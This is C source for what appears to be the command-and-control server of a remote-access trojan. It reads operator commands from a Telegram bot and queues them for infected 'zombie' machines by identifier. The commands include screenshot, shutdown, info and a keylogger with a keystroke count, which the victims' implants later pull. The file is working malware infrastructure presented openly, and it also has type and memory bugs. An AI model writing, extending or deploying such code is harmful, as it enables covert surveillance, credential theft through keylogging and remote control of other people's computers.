#include <curl/curl.h>
#include <json-c/json.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "cmds.h"
#include "fiobj.h"
#include "utils.h"

char *base_uri;
int init_date;

int last_update_id = 0;
HashTable *cmd_table;

void init_telegram(char *token) {
  base_uri = malloc((28 + strlen(token) + 1) * sizeof(char));
  if (!base_uri) {
    printf("Could not allocate memory to the base_uri variable.\n");
    fflush(stdout);
    return;
  }
  strcpy(base_uri, "https://api.telegram.org/bot");
  strcat(base_uri, token);

  init_date = (int)time(NULL) + 25;  // Time plus some padding
  cmd_table = create_table();

  fflush(stdout);
}

void send_telegram_post(const char *ep, const char *data) {
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if (curl) {
    // Telegram URI
    char *uri = malloc((strlen(base_uri) + strlen(ep) + 1) * sizeof(char));
    if (!uri) {
      printf("Could not allocate memory to the uri variable.\n");
      fflush(stdout);
      return;
    }
    strcpy(uri, base_uri);
    strcat(uri, ep);

    // Create appropiate headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Accept: application/json");
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "charsets: utf-8");

    curl_easy_setopt(curl, CURLOPT_URL, uri);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
      fprintf(stderr, "send_photo() failed: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
    free(uri);
  }
  curl_global_cleanup();
  fflush(stdout);
}

void fetch_updates(json_object **buffer) {
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if (curl) {
    // Telegram URI
    char *uri = malloc((strlen(base_uri) + 12 + 1) * sizeof(char));
    if (!uri) {
      printf("Could not allocate memory to the uri variable.\n");
      fflush(stdout);
      return;
    }
    strcpy(uri, base_uri);
    strcat(uri, "/getUpdates");

    // Create appropiate headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Accept: application/json");
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "charsets: utf-8");

    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_easy_setopt(curl, CURLOPT_URL, uri);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    // Writing the body
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
      fprintf(stderr, "fetch_updates() failed: %s\n", curl_easy_strerror(res));
    } else {
      *buffer = json_tokener_parse(chunk.memory);
    }

    curl_easy_cleanup(curl);
    free(uri);
  }

  curl_global_cleanup();
  fflush(stdout);
}

void write_commands(json_object *buf_arr, const char *id) {
  char *ht_res;
  if ((ht_res = ht_search(cmd_table, id)) != NULL) {
    if (strstr(ht_res, ":")) {
      char *tk = strtok(ht_res, ":");
      while (tk != NULL) {
        json_object_array_add(buf_arr, json_object_new_string(tk + 1));
        tk = strtok(NULL, ":");
      }
    } else {
      json_object_array_add(buf_arr, json_object_new_string(ht_res + 1));
    }
  }
}

void consume_cmds(char *id) {
  ht_insert(cmd_table, id, "_proc");
}

void *handle_cmds() {
  while (!fio_is_running()) {
    sleep(1);
  }

  struct json_object *obj, *ok, *result;
  int update_len, i;

  while (fio_is_running()) {
    fetch_updates(&obj);

    if (obj != NULL) {
      // Get the ok value
      json_object_object_get_ex(obj, "ok", &ok);
      // If not ok then just continue
      if (!ok) {
        continue;
      }

      json_object_object_get_ex(obj, "result", &result);

      update_len = json_object_array_length(result);
      if (update_len > 0) {
        for (i = 0; i < update_len; i++) {
          struct json_object *update_obj = json_object_array_get_idx(result, i);
          int update_id = json_object_get_int(json_object_object_get(update_obj, "update_id"));

          if (update_id > last_update_id) {
            // Get the message object
            struct json_object *message_obj = json_object_object_get(update_obj, "message");
            // Get the timestamp
            int d = json_object_get_int(json_object_object_get(message_obj, "date"));

            // Check if the message was sent after the bot started (+padding)
            if (init_date < d) {
              last_update_id = update_id;

              struct json_object *chat_obj, *desc_obj, *chat_id_obj, *resp_obj, *resp_tmp;
              
              chat_obj = json_object_object_get(message_obj, "chat");
              desc_obj = json_object_object_get(message_obj, "text");

              chat_id_obj = json_object_object_get(chat_obj, "id");

              // Get the actual data we need
              const char *desc = json_object_get_string(desc_obj);
              const int *chat_id = json_object_get_int(chat_id_obj);

              // Check if the message description contains a space
              if (!strstr(desc, " ")) {
                struct json_object *object, *tmp;

                object = json_object_new_object();

                // Set the chat id
                tmp = json_object_new_int(chat_id);
                json_object_object_add(object, "chat_id", tmp);
                // Set the mesasge text
                tmp = json_object_new_string("Command requires an identifier to work. Please add one as the first argument.");
                json_object_object_add(object, "text", tmp);

                // Send the post request
                send_telegram_post("/sendMessage", json_object_to_json_string(object));
                
                json_object_put(object);
                continue;
              }
              
              // Get the command and the first argument, namely the zombie's identifier
              char *cmd_label = strtok(desc, " ");
              char *id = strtok(NULL, " ");

              if (strcmp(cmd_label, "/screenshot") == 0 ||
                  strcmp(cmd_label, "/shutdown") == 0 ||
                  strcmp(cmd_label, "/background") == 0 ||
                  strcmp(cmd_label, "/info") == 0) {
                // Pre-define the hashtable search result
                char *ht_res;

                // Search in the hashtable and check if the result is NULL
                if ((ht_res = ht_search(cmd_table, id)) == NULL) {
                  // Insert a new entry into the hash table
                  ht_insert(cmd_table, id, cmd_label);
                } else {
                  // Reallocate the memory for the entry in the hash table
                  ht_res = (char *)realloc(ht_res, (strlen(ht_res) + strlen(cmd_label) + 1) + sizeof(char));
                  // Check if the memory reallocation failed
                  if (ht_res == NULL) {
                    continue;
                  }

                  // Declare a temporary variable we'll use later on
                  char *tmp = (char *)malloc((strlen(cmd_label) + 2) * sizeof(char));
                  // Check if the memory allocation failed
                  if (tmp == NULL) {
                    continue;
                  }

                  // Copy a : to the temporary variable
                  strcpy(tmp, ":");
                  // Add the command label
                  strcat(tmp, cmd_label);

                  // Add the previous commands that were already stored in the hashtable
                  strcat(ht_res, tmp);
                  // Free the temporary variable
                  free(tmp);

                  // Insert/Overwrite into the hashtable
                  ht_insert(cmd_table, id, ht_res);
                }
              } else if (strcmp(cmd_label, "/keylogger") == 0) {
                char *n = strtok(NULL, " ");
                if (n == NULL) {
                  struct json_object *object, *tmp;

                  object = json_object_new_object();

                  // Set the chat id
                  tmp = json_object_new_int(chat_id);
                  json_object_object_add(object, "chat_id", tmp);
                  // Set the mesasge text
                  tmp = json_object_new_string("Command requires an integer to work. Please add one as the second argument.");
                  json_object_object_add(object, "text", tmp);

                  // Send the post request
                  send_telegram_post("/sendMessage", json_object_to_json_string(object));
                
                  json_object_put(object);
                  continue;
                }

                // Manufacture a new cmd_label
                char *new_label = malloc((strlen(cmd_label) + 3 + strlen(n)) * sizeof(char));
                strcpy(new_label, cmd_label);
                strcat(new_label, "->");
                strcat(new_label, n);

                char *ht_res;
                if ((ht_res = ht_search(cmd_table, id)) == NULL) {
                  ht_insert(cmd_table, id, new_label);
                } else {
                  ht_res = (char *)realloc(ht_res, (strlen(ht_res) + strlen(new_label) + 1) + sizeof(char));
                  if (ht_res == NULL) {
                    continue;
                  }

                  char *tmp = (char *)malloc((strlen(new_label) + 2) * sizeof(char));
                  if (tmp == NULL) {
                    continue;
                  }

                  strcpy(tmp, ":");
                  strcat(tmp, new_label);

                  strcat(ht_res, tmp);
                  free(tmp);

                  ht_insert(cmd_table, id, ht_res);
                }

                free(new_label);
              }

              // ===== Send the mesasge
              resp_obj = json_object_new_object();
              // Set the chat id
              resp_tmp = json_object_new_int(chat_id);
              json_object_object_add(resp_obj, "chat_id", resp_tmp);
              // Set the mesasge text
              resp_tmp = json_object_new_string("The command has been added to the queue and should be pulled shortly.");
              json_object_object_add(resp_obj, "text", resp_tmp);

              // Send the post request
              send_telegram_post("/sendMessage", json_object_to_json_string(resp_obj));
              
              json_object_put(resp_obj);

              // ===== Log the table for reference
              printf("\n\nHash Table\n-------------------\n");
              for (int i = 0; i < cmd_table->size; i++) {
                if (cmd_table->items[i]) {
                  printf("Index: %d, Key: %s, Value: %s\n", i,
                         cmd_table->items[i]->key, cmd_table->items[i]->value);
                }
              }
              printf("-------------------\n\n");
              
              // Flush the standard output
              fflush(stdout);
            }
          }
        }
      }
    }
    // Sleep so we don't overload on curl requests, and to keep telegram happy
    sleep(1);
  }

  printf("INFO: Shutting down command thread.\n");
  pthread_exit(NULL);
}